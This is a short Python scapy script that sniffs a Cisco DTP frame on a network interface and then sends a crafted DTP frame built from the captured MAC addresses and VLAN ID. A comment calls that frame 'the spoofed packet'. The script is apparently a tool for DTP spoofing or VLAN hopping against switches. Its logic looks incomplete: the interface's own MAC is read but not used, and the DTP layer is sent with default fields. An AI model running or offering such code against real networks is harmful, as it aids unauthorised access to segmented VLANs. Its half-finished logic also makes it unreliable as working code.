from scapy.all import *
from scapy.contrib.dtp import DTP
import sys

def get_interface_mac(interface):
    return get_if_hwaddr(interface)

def get_vlan_id(pkt):
    if pkt.haslayer(Dot1Q):
        return pkt[Dot1Q].vlan
    return None

def dtp_filter(pkt):
    return (
        pkt.haslayer(SNAP) and
        pkt.getlayer(SNAP).OUI == 0x00000C and
        pkt.getlayer(SNAP).code == 0x2004
    )

def get_dtp_packet(interface):
    def pkt_callback(pkt):
        if dtp_filter(pkt):
            src_mac = pkt.src
            dst_mac = pkt.dst
            vlan_id = get_vlan_id(pkt)
            print(f"Source MAC: {src_mac}")
            print(f"Destination MAC: {dst_mac}")
            print(f"VLAN ID: {vlan_id}")
            # Add additional functionality here to handle the spoofed packet
            send_dtp_packet(interface, src_mac, dst_mac, vlan_id)

    sniff(iface=interface, prn=pkt_callback, count=1)

def send_dtp_packet(interface, src_mac, dst_mac, vlan_id):
    dtp_packet = (
        Ether(src=src_mac, dst=dst_mac) /
        Dot1Q(vlan=vlan_id) /
        LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) /
        SNAP(OUI=0x00000c, code=0x2004) /
        DTP()
    )
    sendp(dtp_packet, iface=interface)
    print(f"Sent DTP packet from {src_mac} to {dst_mac} on VLAN {vlan_id}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <interface>")
        sys.exit(1)

    interface = sys.argv[1]
    src_mac = get_interface_mac(interface)
    print(f"Interface MAC Address: {src_mac}")
    get_dtp_packet(interface)
